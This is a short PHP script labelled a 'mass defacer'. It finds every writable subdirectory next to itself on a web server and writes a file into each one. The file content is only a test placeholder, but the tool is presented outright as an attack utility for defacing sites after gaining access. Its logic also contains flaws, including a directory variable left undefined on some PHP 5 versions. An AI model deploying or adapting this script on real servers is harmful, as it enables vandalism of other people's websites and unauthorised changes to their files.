<?php

# pwndirs.php - Mass defacer. What?
# v. 2018-04-18

# Functions
##

# Slash detection
function slashDetect() {
    if ( function_exists('php_uname') ) {
        if ( strtoupper(substr(php_uname('s'), 0, 3)) === 'WIN' ) {
            $OSlash = '\\';
        } else {
            $OSlash = '/';
        }
    } elseif ( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ) {
        $OSlash = '\\';
    } else {
        $OSlash = '/';
    }

    return $OSlash;
}

# Find PHP version and current dir
function currentDir() {
    $vers[0] = '1';
    $vers[1] = '1';

    if ( function_exists('phpversion') ) {
        $vers = explode('.', substr(phpversion(), 0, 3));
    }

    if ($vers[0] <= 5) {
        if ($vers[1] <= 3) {
            $curDir = dirname(__FILE__);
        }
    } else {
        $curDir = __DIR__;
    }
    return $curDir;
}

$dir = currentDir();
$slash = slashDetect();
$filesArray = scandir($dir);
$dirsArray = [];
$fileName = 'test.txt';
$fileContent = "This is a test.\n";

foreach ($filesArray as $file) {
    $dirsPath = $dir . $slash . $file;

    if ( is_writable($file) ) {
        if ($file === '.' or $file === '..') {
            continue;
        } elseif ( is_dir($dirsPath) ) {
            array_push($dirsArray, $dirsPath);
        }
    }
}

foreach ($dirsArray as $pwned) {
    $file = $pwned . $slash . $fileName;
    file_put_contents($file, $fileContent);
}
